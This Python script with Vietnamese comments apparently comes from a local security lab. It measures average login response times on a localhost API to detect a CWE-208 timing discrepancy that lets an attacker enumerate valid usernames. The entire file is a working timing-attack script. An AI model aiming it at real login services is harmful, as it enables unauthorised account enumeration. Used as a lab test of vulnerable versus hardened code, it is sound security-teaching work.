# Phân tích Timing Attack.
# Đo lường độ trễ giữa việc xác thực tài khoản có thật và không có thật trong hệ thống.
# Lỗ hổng: CWE-208 Observable Timing Discrepancy.

import requests
import time

URL = "http://127.0.0.1:8000/api/auth/login"
NUM_REQUESTS = 100 # Số lượng mẫu 

def measure_time(username, password):
    times = []
    for _ in range(NUM_REQUESTS):
        start = time.time()
        requests.post(URL, json={"username": username, "password": password})
        times.append(time.time() - start)
    # Trả về thời gian trung bình của một truy vấn
    return sum(times) / len(times)

def run_attack():
    print("⏱️ TIMING ATTACK ⏱️\n")
    
    # Đo đạc trên tài khoản có tồn tại trong cơ sở dữ liệu
    print(f"Đang gửi {NUM_REQUESTS} requests cho tài khoản thật...")
    time_exist = measure_time("victim_1", "wrong_password")
    
    # Đo đạc trên tài khoản không tồn tại
    print(f"Đang gửi {NUM_REQUESTS} requests cho tài khoản giả ...")
    time_not_exist = measure_time("ghost_user", "wrong_password")
    
    print("\n📊 KẾT QUẢ ĐO ĐẠC:")
    print(f"- Thời gian máy chủ phản hồi User TỒN TẠI:      {time_exist:.5f} giây")
    print(f"- Thời gian máy chủ phản hồi User KHÔNG TỒN TẠI: {time_not_exist:.5f} giây")
    
    delta = abs(time_exist - time_not_exist)
    print(f"\n=> ĐỘ LỆCH THỜI GIAN: {delta:.5f} giây")
    
    # Ngưỡng phát hiện đã được tinh chỉnh để bắt được độ lệch cực nhỏ của thuật toán MD5
    # Ở chế độ Secure, độ lệch sẽ tiệm cận 0.0 do hàm time.sleep() đồng bộ hóa toàn bộ truy vấn.
    if delta >= 0.0001: 
        print("🚨 KẾT LUẬN: HỆ THỐNG CÓ LỖ HỔNG TIMING ATTACK!")
        print("=> Kẻ tấn công có thể lợi dụng độ trễ để rà quét và trích xuất danh sách người dùng.")
    else:
        print("🛡️ KẾT LUẬN: HỆ THỐNG AN TOÀN!")
        print("=> Máy chủ phản hồi đồng nhất, loại bỏ hoàn toàn nguy cơ rà quét tài khoản.")

if __name__ == "__main__":
    run_attack()